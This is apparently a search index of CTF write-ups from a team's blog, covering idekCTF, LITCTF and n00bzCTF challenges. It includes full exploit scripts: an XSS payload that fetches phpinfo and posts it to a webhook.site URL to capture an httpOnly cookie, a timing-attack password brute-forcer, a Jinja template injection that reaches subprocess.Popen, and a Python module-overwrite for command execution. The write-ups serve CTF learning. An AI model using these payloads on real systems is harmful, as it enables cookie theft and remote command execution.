[{"content":"Hello Description: Just to warm you up for the next Fight :\u0026ldquo;D\nIntroduction Then we have an apparently empty page, but where we can via a ?name= parameter enter some text, the page will then respond with hello, {text entered}\nThe with an ngix server\nMoreover, ctf in general gives us the possibility of using an admin bot where the flag is set in the cookies\nSource # filename: index.py \u0026lt;?php function Enhanced_Trim($inp) { $trimmed = array(\u0026quot;\\r\u0026quot;, \u0026quot;\\n\u0026quot;, \u0026quot;\\t\u0026quot;, \u0026quot;/\u0026quot;, \u0026quot; \u0026quot;); return str_replace($trimmed, \u0026quot;\u0026quot;, $inp); } if(isset($_GET['name'])) { $name=substr($_GET['name'],0,23); echo \u0026quot;Hello, \u0026quot;.Enhanced_Trim($_GET['name']); } ?\u0026gt; # filename: info.py \u0026lt;?php phpinfo(); ?\u0026gt; # filename: ngix.conf user www-data; worker_processes 1; events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { root /usr/share/nginx/html; index index.php index.html index.htm; } location = /info.php { allow 127.0.0.1; deny all; } location ~ \\.php$ { root /usr/share/nginx/html; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; fastcgi_pass unix:/var/run/php/php8.2-fpm.sock; } } } As you can see, there are 3 main files to focus on\nThe first is the index file where we see how the page works and the filters used, in particular the fact that we cannot use /, spaces, etc. An info.php file which is definitely suspect and not normally needed but probably has a purpose in the challange And the ngix configuration file, which is very important because it is the one that prevents us from accessing info.php in a simple way. Solution This challenge is very nice in my opinion, neither too difficult nor too complex, it mixes different vulnerabilities in a really nice way\u0026hellip;\nThe first one is designed to catch the cookie, because in the configuration of bot.js we see that the cookie is set to httpOnly, which makes the extraction much more difficult, but looking a little online we understand why it is present, that info.php in fact the function phpinfo() as well as showing several parameters of the php configuration and other information also shows the cookies present at that time\u0026hellip; SO THAT\u0026rsquo;S THE OBJECTIVE, to get your own bot to open /info.php.\nBut how can we do this?\nThe first step is to be able to inject a payload that opens info.php and sends the file somewhere.\nThe only entry point we see is ? name=', which is not sanitised in the best way, in fact by doing \u0026lt;h1\u0026gt;BTC (we make sure that the tag closes itself, otherwise the final / will be filtered out) we notice that the h1 is rendered and this is a first sign that we can do an xss, although we notice that the classic \u0026lt;script\u0026gt;alert('ByteTheCookies') doesn\u0026rsquo;t work, Probably some php configuration or some police, so the xss would be a bit more complex, but we can use the onerror parameter of tag img with some modifications, in fact, if we insert a classic \u0026lt;img src='invalid. jpg' onerror=\u0026quot;alert('ByteTheCookies')\u0026quot;, it will be sanitised by removing the spaces and will not allow the xss to run. But we can work around this very easily, in fact by looking for some workarounds on HackTricks and trying some of them, we find that the payload \u0026lt;img%0Csrc=\u0026quot;invalid.jpg\u0026quot;onerror=\u0026quot;alert('ByteTheCookies')\u0026quot; works.\nGOOD we managed to bypass the xss now we have to create the payload we need\u0026hellip;\nSpecifically, I used: fetch('{target}').then(r=\u0026gt;r.text()).then(t=\u0026gt;{fetch('{url_webhook}',{method:'POST',body:(f=new FormData(),f.append('file',new Blob([t],{type:'text/plain'}),'phpinfo.txt'),f)});console.log('Data sended');});\nThis payload makes an initial request and sends the content to a webhook in the form of a file, so it\u0026rsquo;s all very simple.\nHowever, the problem is that when this payload is sent, it will not work because the URLs contain / which will be removed and this is a significant problem.\nHowever, to get around this we can use a very simple trick, we just need to encode the payload in base64 beforehand and use an eval(atob(payload)).\nBy sending this in the URL, we can make the payload work without any problems. DONE, RIGHT?\nNo, because analysing the nginx configuration we notice an important detail\nlocation = /info.php { allow 127.0.0.1; deny all; } As we can see, /info.php is only accessible from localhost, and spoiler, our bot is not on the same server as the challenge.\nThis may seem like a big obstacle, but in reality, if we search the web for ngix workarounds, we can find something very interesting.\nAs we can see on Hacktricks, if we insert an accessible page immediately after a non-accessible page in the ngix URL, it will redirect us correctly to the non-accessible page, which is exactly what we need.\nSo the final solution becomes:\n# filename: exploit.py import base64 url = \u0026quot;http://idek-hello.chal.idek.team:1337/\u0026quot; url_webhook = 'https://webhook.site/8b10c871-1e0b-4050-8 2e3-e102a73da54e' url_admin = 'https://admin-bot.idek.team/idek-hello' def main(): # Bypass hacktrics https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm target = \u0026quot;http://idek-hello.chal.idek.team:1337/info.php/index.php\u0026quot; exploit = (\u0026quot;fetch('\u0026quot; + target + \u0026quot;').then(r=\u0026gt;r.text()).then(t=\u0026gt;{fetch('\u0026quot;+url_webhook+\u0026quot;',{method:'POST',body:(f=new FormData(),f.append('file',new Blob([t],{type:'text/plain'}),'phpinfo.txt'),f)});console.log('Dati inviati al webhook');});\u0026quot;).encode() main_payload = base64.b64encode(exploit).decode() payload = \u0026quot;\u0026quot;\u0026quot;\u0026lt;img%0Csrc=\u0026quot;invalid.jpg\u0026quot;onerror=\u0026quot;eval(atob('\u0026quot;\u0026quot;\u0026quot; + main_payload + \u0026quot;\u0026quot;\u0026quot;'));\u0026quot;\u0026gt;\u0026quot;\u0026quot;\u0026quot; # Bypassed with %0C final_url_whith_exploit = f\u0026quot;{url}?name={payload}\u0026quot; print(f\u0026quot;Final url: {final_url_whith_exploit}\u0026quot;) # Send the url on the admin bot and download the file on webhook.site print(f\u0026quot;Now copy and paste the url on the admin bot: {url_admin} and send the requeste to the admin bot, after this go to the webhook.site and download the file and search the flag in the file\u0026quot;) if __name__ == '__main__': main() $ flag: idek{Ghazy_N3gm_Elbalad} Author: akiidjk ","permalink":"http://localhost:1313/writeups/idekctf2024/hello/","title":"Hello"},{"content":" IdekCTF 2024 Description idekCTF is an information security CTF competition organized by the idek team and is aimed at the entire spectrum from high school and university students to experienced players. idekCTF will cover the standard Jeopardy-style CTF topics (binary exploitation, reverse engineering, cryptography, web exploitation, and forensics) as well as other, less standard categories.\nPerformance Summary CTFs: 6/35 Total point: 732 Position: 101 Rating points: ? Writeups Web Hello ","permalink":"http://localhost:1313/writeups/idekctf2024/","title":"IdekCTF 2024"},{"content":"Kirbytime Description: Welcome to Kirby\u0026rsquo;s Website.\nIntroduction We find ourselves in front of a very pink Kirby-themed page, where we are asked to enter a password of 7 characters.\nSource # filename: main.py import sqlite3 from flask import Flask, request, redirect, render_template import time app = Flask(__name__) @app.route('/', methods=['GET', 'POST']) def login(): message = None if request.method == 'POST': password = request.form['password'] real = 'REDACTED' if len(password) != 7: return render_template('login.html', message=\u0026quot;you need 7 chars\u0026quot;) for i in range(len(password)): if password[i] != real[i]: message = \u0026quot;incorrect\u0026quot; return render_template('login.html', message=message) else: time.sleep(1) if password == real: message = \u0026quot;yayy! hi kirby\u0026quot; return render_template('login.html', message=message) if __name__ == '__main__': app.run(host='0.0.0.0') As we can see in the code at the \u0026lsquo;/\u0026rsquo; endpoint, when the method and post, it takes the password value from the form, checks the length to be 7 and starts iterating over each character to check if it is correct, it triggers a time.sleep(1) otherwise it returns an error.\nSolution The solution is very simple, in fact we can compare it to a kind of time based, when the character is correct we know that the request will take n seconds to return depending on the number of correct characters. With this script we can easily find the flag, but only with a little patience (I recommend a cup of coffee in between).\n# filename: exploit.py import string import requests url = 'redacted' alphabet = string.printable length = 7 correct_flag = 'a' * length correct_letter = 0 flag_list = list(correct_flag) number_of_second_to_wait = 7 while (correct_letter != length): for letter in alphabet: flag_list[correct_letter] = letter flag = \u0026quot;\u0026quot;.join(flag_list) print(flag) payload = {\u0026quot;password\u0026quot;: flag} r = requests.post(url=url, data=payload) assert r.status_code == 200 print(\u0026quot;Time: \u0026quot;, r.elapsed.total_seconds()) if r.elapsed.total_seconds() \u0026gt;= number_of_second_to_wait: correct_letter = correct_letter + 1 number_of_second_to_wait += 1 print(flag) break print(\u0026quot;Flag found: \u0026quot;, \u0026quot;LITCTF{\u0026quot; + flag + \u0026quot;}\u0026quot;) $ flag: LITCTF{kBySlaY} Author: akiidjk ","permalink":"http://localhost:1313/writeups/litctf2024/kirbytime/","title":"Kirbytime"},{"content":" Lexington Informatics Tournament CTF Description Lexington Informatics Tournament CTF 2024 is a Jeopardy-style, beginner-friendly online CTF that\u0026rsquo;s open to everyone.\nPerformance Summary CTFs: 18/32 Total point: 2068 Position: 95 Rating points: 19.095 Writeups Web Kirbytime ","permalink":"http://localhost:1313/writeups/litctf2024/","title":"Lexington Informatics Tournament CTF 2024"},{"content":"File Sharing Portal Description: Welcome to the file sharing portal! We only support tar files!\nIntroduction The ctf has a very simple structure: we have a form in which we are asked to insert a tar file; once the tar file has been inserted, it is unzipped and we are shown the name of files it contains; by clicking on the different files, we can read their contents.\nSource The source has comments added later to allow a better understanding of the code in the writeups\n# filename: server.py #!/usr/bin/env python3 from flask import Flask, request, redirect, render_template, render_template_string import tarfile from hashlib import sha256 import os app = Flask(__name__) @app.route('/',methods=['GET','POST']) def main(): # This function mainly deals with loading the tar file into the server's file system. global username if request.method == 'GET': return render_template('index.html') elif request.method == 'POST': file = request.files['file'] if file.filename[-4:] != '.tar': # Check that the file passed is actually a tar file return render_template_string(\u0026quot;\u0026lt;p\u0026gt; We only support tar files as of right now!\u0026lt;/p\u0026gt;\u0026quot;) # Otherwise, it renders an error message name = sha256(os.urandom(16)).digest().hex() # Creates a random name that it will use to name our tar and the folder in the server's file system os.makedirs(f\u0026quot;./uploads/{name}\u0026quot;, exist_ok=True) # Create the directory file.save(f\u0026quot;./uploads/{name}/{name}.tar\u0026quot;) # Save the tar file try: # Extract the tar file tar_file = tarfile.TarFile(f'./uploads/{name}/{name}.tar') tar_file.extractall(path=f'./uploads/{name}/') return render_template_string(f\u0026quot;\u0026lt;p\u0026gt;Tar file extracted! View \u0026lt;a href='/view/{name}'\u0026gt;here\u0026lt;/a\u0026gt;\u0026quot;) except: return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Failed to extract file!\u0026lt;/p\u0026gt;\u0026quot;) @app.route('/view/\u0026lt;name\u0026gt;') def view(name): # This function displays the files contained in the .tar file if not all([i in \u0026quot;abcdef1234567890\u0026quot; for i in name]): # Check that the file name is in hexadecimal, to avoid any kind of malicious input return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) #print(os.popen(f'ls ./uploads/{name}').read()) #print(name) files = os.listdir(f\u0026quot;./uploads/{name}\u0026quot;) # List all files in the previously created folder out = '\u0026lt;h1\u0026gt;Files\u0026lt;/h1\u0026gt;\u0026lt;br\u0026gt;' files.remove(f'{name}.tar') # Remove the tar file from the list for i in files: out += f'\u0026lt;a href=\u0026quot;/read/{name}/{i}\u0026quot;\u0026gt;{i}\u0026lt;/a\u0026gt;' # Show via templates all file names # except: return render_template_string(out) # Render the template with the render_template_string function @app.route('/read/\u0026lt;name\u0026gt;/\u0026lt;file\u0026gt;') def read(name,file): # The function shows the contents of the single file if (not all([i in \u0026quot;abcdef1234567890\u0026quot; for i in name])): # Check that the file name is in hexadecimal, to avoid any kind of malicious input return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) if ((\u0026quot;..\u0026quot; in name) or (\u0026quot;..\u0026quot; in file)) or ((\u0026quot;/\u0026quot; in file) or \u0026quot;/\u0026quot; in name): # Other controls to avoid path er return render_template_string(\u0026quot;\u0026lt;p\u0026gt;Error!\u0026lt;/p\u0026gt;\u0026quot;) f = open(f'./uploads/{name}/{file}') # Open the file data = f.read() f.close() return data # Return the content of file if __name__ == '__main__': app.run(host='0.0.0.0', port=1337) We can therefore see that there are several parameter checks, and at first one might think that the code is 100% safe.\nSolution The first thing that came to mind was to create a symbolic link to access the flag, and indeed this works (try with server.py), the problem is that the filename of the flag is unknown and this does not allow us to create a valid symbolic link.\nOnce we realised this, we did a thorough analysis of the code and came to the conclusion that the only thing that was not being checked was the name of the unpacked tar file allowing us to insert anything. By combining this with the \u0026lsquo;render_template_string\u0026rsquo; function (a vulnerable function of flask), it is possible to perform a template injection.\n# filename: exploit.py import requests import os import tarfile from bs4 import BeautifulSoup url = 'http://redacted.challs.n00bzunit3d.xyz:8080/' def create_tar(tar_name, file): with tarfile.open(tar_name, 'w') as tar: tar.add(file, arcname=os.path.basename(file)) print(f'Tar file created: {tar_name}') def create_payload(payload): with open(payload, 'w') as f: f.write('Remember to byte the cookies') create_tar('exploit.tar', payload) print(f'Payload created: {payload}') def get_url_view(text): soup = BeautifulSoup(text, 'html5lib') return [a['href'] for a in soup.find_all('a', href=True)][0] def leak_subprocess_index(): payload = \u0026quot;{{int.__class__.__base__.__subclasses__()}}\u0026quot; create_payload(payload) r = requests.post(url, files={'file': open('exploit.tar', 'rb')}) url_file = get_url_view(r.text) r = requests.get(url + url_file) text = r.text[r.text.index('[')+1:] list_classes = text.split(',') for i, c in enumerate(list_classes): if 'subprocess.Popen' in c: print(f'Index subprocess.Popen: {i}') return str(i) def get_flag(index): payload = \u0026quot;{{int.__class__.__base__.__subclasses__()[\u0026quot; + \\ index + \u0026quot;]('cat *', shell=True, stdout=-1).communicate()}}\u0026quot; create_payload(payload) r = requests.post(url, files={'file': open('exploit.tar', 'rb')}) url_file = get_url_view(r.text) r = requests.get(url + url_file) flag = r.text[r.text.index('n00bz{'):r.text.index('}')+1] print(f'Flag: {flag}') def main(): subprocess_index = leak_subprocess_index() get_flag(subprocess_index) if __name__ == '__main__': main() $ flag: n00bz{n3v3r_7rus71ng_t4r_4g41n!_b3506983087e} Author: akiidjk ","permalink":"http://localhost:1313/writeups/noobzctf2024/filesharingportal/","title":"File Sharing Portal"},{"content":"Waas Description: Writing as a Service!\nIntroduction WaaS (Writing as a Service) allows us to overwrite a file on the system (after some input validation) and insert anything (until a newline is met) we want in it.\nimport subprocess from base64 import b64decode as d while True: print(\u0026quot;[1] Write to a file\\n[2] Get the flag\\n[3] Exit\u0026quot;) try: inp = int(input(\u0026quot;Choice: \u0026quot;).strip()) except: print(\u0026quot;Invalid input!\u0026quot;) exit(0) if inp == 1: file = input(\u0026quot;Enter file name: \u0026quot;).strip() assert file.count('.') \u0026lt;= 2 # Why do you need more? assert \u0026quot;/proc\u0026quot; not in file # Why do you need to write there? assert \u0026quot;/bin\u0026quot; not in file # Why do you need to write there? assert \u0026quot;\\n\u0026quot; not in file # Why do you need these? assert \u0026quot;chall\u0026quot; not in file # Don't be overwriting my files! try: f = open(file,'w') except: print(\u0026quot;Error! Maybe the file does not exist?\u0026quot;) f.write(input(\u0026quot;Data: \u0026quot;).strip()) f.close() print(\u0026quot;Data written sucessfully!\u0026quot;) if inp == 2: flag = subprocess.run([\u0026quot;cat\u0026quot;,\u0026quot;fake_flag.txt\u0026quot;],capture_output=True) # You actually thought I would give the flag? print(flag.stdout.strip()) Solution At first one may think of trying to bypass the input validation to perhaps rewrite the workings of the cat command or the challenge file itself, but this isn\u0026rsquo;t possible. Something very bizarre is the imported but unused b64decode from the base64 module, which is what allows us to solve the challenge. When python imports modules it looks in sys.path, which has a list of valid directories to import modules from. After a quick scan through the python3 docs we find out that the first directory it looks through is the same directory the file is in, this means that if we have a base64.py file in the directory then python will try to import a b64decode symbol from that file instead of the common known module. One more feature of python\u0026rsquo;s import behavior we can use is the that all the code in an imported module will be executed. For example if a file test.py has print('Hello, World!') and it can be executed (for example if it\u0026rsquo;s at the lowest indentation level) then a file with import test will indeed see Hello, World! printed to stdout. Therefore, since the open function with a 'w' flag will create a file if it does not exist, we can simply create a file named base64.py and write our malicious code in it. Something like this will do the trick:\nimport os; b64decode = 0; os.system(\u0026quot;cat flag.txt\u0026quot;) But the flag isn\u0026rsquo;t our yet; we need to use the fact that the instance does not reset its files every time we connect to it, which means that our base64.py will remain in the directory for the lifetime of the instance. This means we simply need to reconnect to it and get our flag.\nsolve.py\nfrom pwn import * def solve(): r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance r.sendlineafter(b'Choice: ', b'1') # 1 to write a file r.sendlineafter(b'Enter file name: ', b'base64.py') r.sendlineafter(b'Data: ', b'import os; b64decode = 0; os.system(\u0026quot;cat flag.txt\u0026quot;)') r.close() r = remote('challs.n00bzunit3d.xyz', 10478) # PORT depends on the instance flag = r.recvline().decode() print(f'flag: {flag}') r.close() if __name__ == '__main__': solve() flag: n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_f5c63f47af0e} Author: vympel\n","permalink":"http://localhost:1313/writeups/noobzctf2024/waas/","title":"WaaS"},{"content":" N00bz CTF 2024 Description A 48 hours CTF hosted by n00bz for n00bz. Organized with beginner friendly challenges (and some hard ones), n00bzCTF is dedicated to make cyber security more friendly and approachable for complete n00bz.\nPerformance Summary CTFs: 31/32 Total point: 9794.000 Position: 24 Rating points: 24.067 Writeups Web File Sharing Portal Misc Waas ","permalink":"http://localhost:1313/writeups/n00bzctf2024/","title":"N00bzCTF 2024"}]